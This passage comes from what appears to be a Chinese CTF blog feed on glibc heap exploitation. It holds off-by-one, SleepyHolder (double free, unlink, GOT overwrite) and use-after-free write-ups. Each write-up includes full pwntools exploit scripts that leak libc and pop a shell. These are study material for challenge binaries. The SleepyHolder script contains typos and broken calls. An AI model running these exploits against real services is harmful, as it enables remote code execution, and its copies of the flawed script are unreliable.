<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/8.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:50%;" />

<p>​        3.因为DEL函数也用到了read_in 函数，也可以进行溢出，所以这里DEL(payload)，payload大小为0x1f8，而chunk_d实际可写大小只有0x1f0，因此可以在payload的最后写入fake_pre_size，同时覆写了chunk_e的pre_size和in_use字节。</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/9.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/9.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:50%;" />

<p>​        4.现在释放chunk_e，系统将寻址至chunk_e - pre_size == chunk_e - 0x4e0 == chunk_a,系统将chunk_a unlink，然后合并a到e的所有内存，并入一个unsort chunk。</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/10.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/off_by_one/10.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:50%;" />

<p>​        5.而chunk_b还在使用，造成了overlap。</p>
<p>​        6.接下来malloc(0x200)两次，第一次是把原来释放的chunk_a分配出来，第二次是在后来被系统合并的大chunk中割下0x210的空间，然后这个大chunk的地址将和chunk_b重合。由于只有大chunk一个unsort chunk在bin中，因此其fd，bk指向main_arena，于是可以溢出了。</p>
<h3 id="C-Leak-Libc-base-amp-get-shell"><a href="#C-Leak-Libc-base-amp-get-shell" class="headerlink" title="C. Leak Libc_base &amp; get shell"></a>C. Leak Libc_base &amp; get shell</h3><p>​        1.GET(chunk_b)并通过计算可以得到libc_base，同时也可以算出malloc_hook的地址。</p>
<p>​        2.用one_gadget得到libc中excute(“/bin/sh”);的地址</p>
<p>​        3.malloc(0x100)，可以得到chunk_b到chunk_b + 0x100的内存，用来填充chunk_b，并用malloc_hook的上方地址覆写chunk_c的fd。</p>
<p>​        4.malloc两次，以malloc_hook上方地址为首地址的chunk，写入one_gadget到malloc_hook，完事儿。。</p>
<h3 id="D-Exploit"><a href="#D-Exploit" class="headerlink" title="D  . Exploit"></a>D  . Exploit</h3><p>​        脚本还是得参考CTF-Wiki，自己真是肝不出来。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># vim:fenc=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">2</span>:</span><br><span class="line">    DEBUG = <span class="number">0</span></span><br><span class="line">    HOST = sys.argv[<span class="number">1</span>]</span><br><span class="line">    PORT = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    DEBUG = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        PATH = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    p = process(PATH)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>) <span class="comment"># ubuntu 16.04</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">command_num</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;command:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command_num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put</span>(<span class="params">key, size, data</span>):</span></span><br><span class="line">    cmd(<span class="string">&#x27;PUT&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;key:&#x27;</span>)</span><br><span class="line">    p.sendline(key)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;data:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) &lt; size:</span><br><span class="line">        p.send(data.ljust(size, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">key</span>):</span></span><br><span class="line">    cmd(<span class="string">&#x27;DEL&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;key:&#x27;</span>)</span><br><span class="line">    p.sendline(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">key</span>):</span></span><br><span class="line">    cmd(<span class="string">&#x27;GET&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;key:&#x27;</span>)</span><br><span class="line">    p.sendline(key)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">    num = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27; bytes&#x27;</span>).strip(<span class="string">&#x27; bytes&#x27;</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recv(num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># avoid complicity of structure malloc</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        put(<span class="built_in">str</span>(i), <span class="number">0x38</span>, <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        delete(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># allocate what we want in order</span></span><br><span class="line">    put(<span class="string">&#x27;1&#x27;</span>, <span class="number">0x200</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    put(<span class="string">&#x27;2&#x27;</span>, <span class="number">0x50</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    put(<span class="string">&#x27;5&#x27;</span>, <span class="number">0x68</span>, <span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">    put(<span class="string">&#x27;3&#x27;</span>, <span class="number">0x1f8</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    put(<span class="string">&#x27;4&#x27;</span>, <span class="number">0xf0</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    put(<span class="string">&#x27;defense&#x27;</span>, <span class="number">0x400</span>, <span class="string">&#x27;defense-data&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># free those need to be freed</span></span><br><span class="line">    delete(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    delete(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    delete(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x1f0</span> + p64(<span class="number">0x4e0</span>))</span><br><span class="line"></span><br><span class="line">    delete(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    put(<span class="string">&#x27;0x200&#x27;</span>, <span class="number">0x200</span>, <span class="string">&#x27;fillup&#x27;</span>)</span><br><span class="line">    put(<span class="string">&#x27;0x200 fillup&#x27;</span>, <span class="number">0x200</span>, <span class="string">&#x27;fillup again&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    libc_leak = u64(get(<span class="string">&#x27;2&#x27;</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    p.info(<span class="string">&#x27;libc leak: 0x%x&#x27;</span> % libc_leak)</span><br><span class="line"></span><br><span class="line">    libc_base = libc_leak - <span class="number">0x3c4b78</span></span><br><span class="line"></span><br><span class="line">    p.info(<span class="string">&#x27;libc_base: 0x%x&#x27;</span> % libc_base)</span><br><span class="line"></span><br><span class="line">    put(<span class="string">&#x27;fastatk&#x27;</span>, <span class="number">0x100</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x58</span> + p64(<span class="number">0x71</span>) + p64(libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span> + <span class="number">5</span> - <span class="number">8</span>))</span><br><span class="line">    put(<span class="string">&#x27;prepare&#x27;</span>, <span class="number">0x68</span>, <span class="string">&#x27;prepare data&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line">    put(<span class="string">&#x27;attack&#x27;</span>, <span class="number">0x68</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">3</span> + p64(one_gadget))</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">&#x27;DEL&#x27;</span>) <span class="comment"># malloc(8) triggers one_gadget</span></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>​        ps.不过有一个地方一直没弄明白：前面说的每一次PUT都会mallc()3次，而且理应是连续地址的三个chunk，但是CTF-Wiki的解法，以及各种其他师傅的解法都只考虑了data chunk，我和刘老板倒是考虑了三个chunk连续的情况，但是我没整出来。暂时先按照writeup的来吧。。之后再回头看看。</p>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>SleepHolder</title>
    <url>/2020/03/03/SleepHolder/</url>
    <content><![CDATA[<p>​                关于fastbin_dup_consolidate，以及unlink的另一题。<span id="more"></span></p>
<p>​                今天做题还挺快，毕竟是之前已经研究过一点的题目。</p>
<h2 id="0x00-fastbin-dup-consolidate"><a href="#0x00-fastbin-dup-consolidate" class="headerlink" title="0x00 . fastbin_dup_consolidate"></a>0x00 . fastbin_dup_consolidate</h2><p>​                贴一下代码作为例子。。(code from how2heap)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">void</span> p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, Allocated two fastbins p1=%p p2=%pn, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, Now free p1!n);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, Allocated large bin to trigger <span class="built_in">malloc_consolidate</span>() p3=%pn, p3);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, In <span class="built_in">malloc_consolidate</span>(), p1 is moved to the unsorted bin.n);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, Trigger the <span class="keyword">double</span> free vulnerability!n);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, We can pass the check in <span class="built_in">malloc</span>() since p1 is <span class="keyword">not</span> fast top.n);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, Now p1 is in unsorted bin <span class="keyword">and</span> fast bin. So we<span class="number">&#x27;</span>will get it twice %p %pn, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​                代码说明了两件事：</p>
<p>​                1、要实现double并非只能用释放堆块来掩护：free(1);free(2);free(1);还可以申请堆块来掩护：free(1);malloc(2);free(1);</p>
<p>​                2、系统在分配large chunk的时候会调用malloc_consolidate()，这个函数相当于free()，就是一个回收函数，主要功能是将fastbin中的chunk整理一下，能合并就合并，不能合并也清除一下使用标志位(inuse = 0)，然后全部丢到unsort bin里面。</p>
<p>​                3、所以如果再malloc()一次，就可以多free(1)一次，因为人家本来也不在fast bin，而且也不被top chunk所指。</p>
<h2 id="0x01-SleepyHolder-Write-Up"><a href="#0x01-SleepyHolder-Write-Up" class="headerlink" title="0x01 . SleepyHolder Write Up"></a>0x01 . SleepyHolder Write Up</h2><h3 id="A-分析程序"><a href="#A-分析程序" class="headerlink" title="A . 分析程序"></a>A . 分析程序</h3><p>​                运行看看效果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Waking Sleepy Holder up ...</span><br><span class="line">Hey! Do you have any secret?</span><br><span class="line">I can help you to hold your secrets, and no one will be able to see it :)</span><br><span class="line">1. Keep secret</span><br><span class="line">2. Wipe secret</span><br><span class="line">3. Renew secret</span><br><span class="line">1</span><br><span class="line">What secret do you want to keep?</span><br><span class="line">1. Small secret</span><br><span class="line">2. Big secret</span><br><span class="line">3. Keep a huge secret and lock it forever</span><br><span class="line">1</span><br><span class="line">Tell me your secret: </span><br><span class="line">AAAAAA</span><br><span class="line">1. Keep secret</span><br><span class="line">2. Wipe secret</span><br><span class="line">3. Renew secret</span><br><span class="line">3</span><br><span class="line">Which Secret do you want to renew?</span><br><span class="line">1. Small secret</span><br><span class="line">2. Big secret</span><br><span class="line">1</span><br><span class="line">Tell me your secret: </span><br><span class="line">Small</span><br><span class="line">1. Keep secret</span><br><span class="line">2. Wipe secret</span><br><span class="line">3. Renew secret</span><br><span class="line">2</span><br><span class="line">Which Secret do you want to wipe?</span><br><span class="line">1. Small secret</span><br><span class="line">2. Big secret</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>​                看看保护和文件格式：</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/SleepHolder/1.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/SleepHolder/1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:67%;" />

<p>​                主要函数如下，除此之外本程序中的alarm()也需要keypatch掉。</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/SleepHolder/3.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/SleepHolder/3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="  />

<p>​                分析主要函数：</p>
<p>​                Add():只允许分配small,big,huge三种secret，每种只能分配一次，而且huge只要分配过后，就不再允许使用huge secret了。另外，这三种secret的指针都位于bss段，是全局变量。</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/SleepHolder/2.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/SleepHolder/2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:87%;" />

<p>​                Wipe():free()时未检查指针是否为空，存在Double free漏洞。</p>
<p>​                Renew():输入限制大小，不可堆溢出。因此构造和输入payload时都要根据secret大小来选择。</p>
<p>​                另外程序中没有找到输出函数，大致方向还是修改got表，puts(func@plt)，计算偏移得到libc，再getshell。</p>
<h3 id="B-内存布局"><a href="#B-内存布局" class="headerlink" title="B . 内存布局"></a>B . 内存布局</h3><ul>
<li><p>申请small chunk和big chunk，然后释放small chunk。</p>
</li>
<li><p>申请huge chunk，此时由于malloc_consolidate()，small chunk被丢进unsort bin。</p>
</li>
<li><p>再释放small chunk，又把small chunk丢进fast bin。double free。</p>
</li>
<li><p>small chunk构造fake_chunk，并修改big chunk的标志位，欺骗系统相信fake chunk已经free，需要合并。</p>
</li>
<li><p>此时释放big chunk，系统会使其与small_chunk里面的fake_chunk合并，导致unlink。</p>
</li>
<li><p>此时写入fake chunk中的指针成功偏移。</p>
<h3 id="C-Leak-amp-Getshell"><a href="#C-Leak-amp-Getshell" class="headerlink" title="C  . Leak &amp; Getshell"></a>C  . Leak &amp; Getshell</h3></li>
<li><p>通过small_ptr把big_ptr、small_ptr和3个标志位分别改成atoi@plt，free@got，和1。</p>
</li>
<li><p>renew(1)将puts@got写入small_ptr，其实是覆写了free@got。</p>
</li>
<li><p>free(2)相当于puts(atoi@plt)，通过计算可以透出libc地址啦。</p>
</li>
<li><p>现在我们已经成功透到了libc的地址，通过计算可以得到system地址了。</p>
</li>
<li><p>renew(1)将system_addr写入到small_ptr，其实也是覆写了free@got。</p>
</li>
<li><p>renew(2)将”/bin/sh\x00”写入到big_ptr待用。</p>
</li>
<li><p>现在只要wipe(2)，实际上就是getshell咯(。・∀・)ノ。</p>
<h4 id="D-Exp"><a href="#D-Exp" class="headerlink" title="D . Exp"></a>D . Exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./SleepyHolder&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./SleepyHolder&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">small_ptr = <span class="number">0x06020D0</span></span><br><span class="line">free_addr = elf.got[free]</span><br><span class="line">puts_addr = elf.got[puts]</span><br><span class="line">puts_plt = elf.plt[puts]</span><br><span class="line">atoi_addr = elf.got[atoi]</span><br><span class="line">atoi_offset = libc.symbols[atoi]</span><br><span class="line">system_offset = libc.symbols[system]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	p.recvuntill(<span class="string">&quot;3. Renew secret\n&quot;</span>)</span><br><span class="line">	p.send(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">	p.send(<span class="built_in">str</span>(index))</span><br><span class="line">	p.recvuntill(<span class="string">&quot;Tell me your secret:\n&quot;</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wipe</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.recvuntill(<span class="string">&quot;3. Renew secret\n&quot;</span>)</span><br><span class="line">	p.send(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.recvuntill(<span class="string">&quot;2. Big secret\n&quot;</span>)</span><br><span class="line">	p.send(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">renew</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	p.recvuntill(<span class="string">&quot;3. Renew secret&quot;</span>)</span><br><span class="line">	p.send(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.recvuntill(<span class="string">&quot;2. Big secret&quot;</span>)</span><br><span class="line">	p.send(<span class="built_in">str</span>(index))</span><br><span class="line">	p.recvuntill(<span class="string">&quot;Tell me your secret:&quot;</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#=======================Memory Arrange=======================</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&quot;AAAAAAAA&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&quot;BBBBBBBB&quot;</span>)</span><br><span class="line">wipe(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">&quot;CCCCCCCCC&quot;</span>)			<span class="comment">#triger malloc_consolidate()</span></span><br><span class="line">wipe(<span class="number">1</span>)				<span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">fake_chunk =p64(<span class="number">0</span>)*<span class="number">2</span>		<span class="comment">#chunk header is useless</span></span><br><span class="line">fake_chunk+=p64(small_ptr-<span class="number">0x18</span>)	<span class="comment">#unlink ptr</span></span><br><span class="line">fake_chunk+=p64(small_ptr-<span class="number">0x10</span>)	<span class="comment">#unlink ptr too</span></span><br><span class="line">fake_chunk+=p64(<span class="number">0x20</span>)		<span class="comment">#made chunk2 believe that chunk1is free to triger unlink</span></span><br><span class="line">add(<span class="number">1</span>,fake_chunk)			<span class="comment">#now we can move the small_ptr later</span></span><br><span class="line">wipe(<span class="number">2</span>)				<span class="comment">#triger the unlink</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#============================ Leak ===========================</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=atoi_addr	<span class="comment">#big_chunk = atoi@got</span></span><br><span class="line">payload+=<span class="string">&#x27;A&#x27;</span>*<span class="number">8</span>	<span class="comment">#the huge_ptr is useless anyway</span></span><br><span class="line">payload+=free_addr	<span class="comment">#small_chunk = free@got</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)*<span class="number">3</span>	<span class="comment">#insure 3 flags == 1</span></span><br><span class="line">renew(<span class="number">1</span>,payload)	<span class="comment">#change the chunk_ptr to got</span></span><br><span class="line">renew(<span class="number">1</span>,puts_plt)	<span class="comment">#change free_addr to puts_plt</span></span><br><span class="line">wipe(<span class="number">2</span>)		<span class="comment">#free(big_ptr) &lt;----&gt; puts(puts_plt)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=========================== GetShell ========================</span></span><br><span class="line">libc_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;/x00&#x27;</span>)) - atoi_offset</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line">renew(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">renew(<span class="number">2</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>UAF (Hacknote)</title>
    <url>/2020/02/28/UAF-Hacknote/</url>
    <content><![CDATA[<p>​        从头开始学习堆堆堆堆😥😥😥（其实之前也没学多少）。<span id="more"></span></p>
<p>​        课设做很久了，摸鱼划水也很久了，抓紧时间系统地肝一下堆题吧。再不好好学要废了。。</p>
<h2 id="1-关于UAF"><a href="#1-关于UAF" class="headerlink" title="1.关于UAF"></a>1.关于UAF</h2><p>​        在malloc得到一个指针并使用后，通常要将其释放并置空。若是出现未将其置空的情况，就容易出现可利用的漏洞，使得用户仍然可以运用指针内的数据或是调用其中的指令。简单来说i，UAF就是对一个已释放内存块的再利用。</p>
<h3 id="CTF-wiki-相关如下："><a href="#CTF-wiki-相关如下：" class="headerlink" title="CTF - wiki 相关如下："></a>CTF - wiki 相关如下：</h3><ul>
<li><p>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</p>
</li>
<li><p>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</p>
</li>
<li><p>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</p>
<p>（Link  - <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free-zh/%EF%BC%89">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free-zh/）</a></p>
<h3 id="Example-from-how2heap"><a href="#Example-from-how2heap" class="headerlink" title="Example from how2heap"></a>Example from how2heap</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">name</span> &#123;</span>  </span><br><span class="line"><span class="keyword">char</span> *myname;  </span><br><span class="line"><span class="built_in"><span class="keyword">void</span></span> (*func)(<span class="keyword">char</span> *str); &#125; NAME; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myprint</span><span class="params">(<span class="keyword">char</span> *str)</span> </span></span><br><span class="line"><span class="function"></span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str); &#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printmyname</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;call print my name\n&quot;</span>); &#125; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    NAME *a;  a = (NAME *)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(struct name));  </span><br><span class="line">    a-&gt;func = myprint;  </span><br><span class="line">    a-&gt;myname = <span class="string">&quot;I can also use it&quot;</span>;  </span><br><span class="line">    a-&gt;<span class="built_in">func</span>(<span class="string">&quot;this is my function&quot;</span>);  </span><br><span class="line">    <span class="comment">// free without modify  free(a);  </span></span><br><span class="line">    a-&gt;<span class="built_in">func</span>(<span class="string">&quot;I can also use it&quot;</span>);  </span><br><span class="line">    <span class="comment">// free with modify  </span></span><br><span class="line">    a-&gt;func = printmyname;  </span><br><span class="line">    a-&gt;<span class="built_in">func</span>(<span class="string">&quot;this is my function&quot;</span>);  </span><br><span class="line">    <span class="comment">// set NULL  a = NULL;  </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;this pogram will crash...\n&quot;</span>);  </span><br><span class="line">    a-&gt;<span class="built_in">func</span>(<span class="string">&quot;can not be printed...&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*The output:</span></span><br><span class="line"><span class="comment">$use_after_free git:(use_after_free) ✗ ./use_after_free        this is my function</span></span><br><span class="line"><span class="comment">I can also use it</span></span><br><span class="line"><span class="comment">call print my name</span></span><br><span class="line"><span class="comment">this pogram will crash...</span></span><br><span class="line"><span class="comment">[1]    38738 segmentation fault (core dumped)  